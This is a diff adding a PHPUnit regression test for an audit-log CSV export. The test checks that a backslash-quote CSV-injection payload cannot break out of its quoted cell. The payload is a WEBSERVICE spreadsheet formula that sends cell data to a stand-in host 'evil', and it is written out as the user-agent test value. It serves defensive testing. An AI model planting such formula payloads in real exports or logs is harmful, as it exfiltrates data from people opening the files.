@@ -615,4 +615,89 @@ final class VaultAuditCommandTest extends TestCase
         self::assertStringContainsString('benign_id', $content);
         self::assertStringNotContainsString("'benign_id", $content);
     }
+
+    #[Test]
+    public function csvExportFileDoesNotBreakOutOfQuotedCellOnBackslashQuote(): void
+    {
+        vfsStream::setup('exports');
+
+        // Literal bytes: x\",=WEBSERVICE("http://evil/"&A1),y
+        // With fputcsv's proprietary escape ('\\') the \" sequence is written
+        // through unchanged and closes the quoted cell, so =WEBSERVICE(...)
+        // becomes a cell of its own that the formula sanitizer never saw.
+        $payload = 'x\\",=WEBSERVICE("http://evil/"&A1),y';
+
+        $entry = AuditLogEntry::fromDatabaseRow([
+            'uid' => 1,
+            'crdate' => 1704067200,
+            'secret_identifier' => 'benign_id',
+            'action' => 'read',
+            'success' => 1,
+            'actor_uid' => 1,
+            'actor_username' => 'admin',
+            'actor_type' => 'be_user',
+            'ip_address' => '10.0.0.1',
+            'user_agent' => $payload,
+            'request_id' => '',
+            'entry_hash' => 'hash',
+            'previous_hash' => '',
+            'context' => '{}',
+        ]);
+
+        $this->auditLogService
+            ->method('query')
+            ->willReturn([$entry]);
+
+        $exportFile = vfsStream::url('exports/audit.csv');
+
+        $exitCode = $this->commandTester->execute([
+            '--export' => $exportFile,
+            '--format' => 'csv',
+        ]);
+
+        self::assertSame(0, $exitCode);
+        $content = (string) file_get_contents($exportFile);
+
+        // Emitted bytes: the embedded double quote is RFC-4180 doubled ("")
+        // instead of being left as the backslash-escaped \" of the vulnerable
+        // output, so the cell stays closed.
+        self::assertStringContainsString('"x\\"",=WEBSERVICE(""http://evil/""&A1),y"', $content);
+        self::assertStringNotContainsString('"x\\",=WEBSERVICE(', $content);
+
+        // Strict re-parse (no proprietary escaping): the payload must survive
+        // as exactly one cell and must not produce any formula cell.
+        $rows = $this->parseCsvStrict($content);
+        self::assertCount(2, $rows);
+
+        $columnIndex = array_search('userAgent', $rows[0], true);
+        self::assertIsInt($columnIndex);
+        self::assertSame($payload, $rows[1][$columnIndex]);
+        self::assertSameSize($rows[0], $rows[1]);
+
+        foreach ($rows[1] as $cell) {
+            self::assertStringStartsNotWith('=', (string) $cell);
+        }
+    }
+
+    /**
+     * Parse CSV without PHP's proprietary backslash escaping (RFC 4180 only).
+     *
+     * @return array<int, array<int, string|null>>
+     */
+    private function parseCsvStrict(string $csv): array
+    {
+        $handle = fopen('php://memory', 'r+');
+        self::assertIsResource($handle);
+        fwrite($handle, $csv);
+        rewind($handle);
+
+        $rows = [];
+        while (($row = fgetcsv($handle, escape: '')) !== false) {
+            $rows[] = $row;
+        }
+
+        fclose($handle);
+
+        return $rows;
+    }
 }
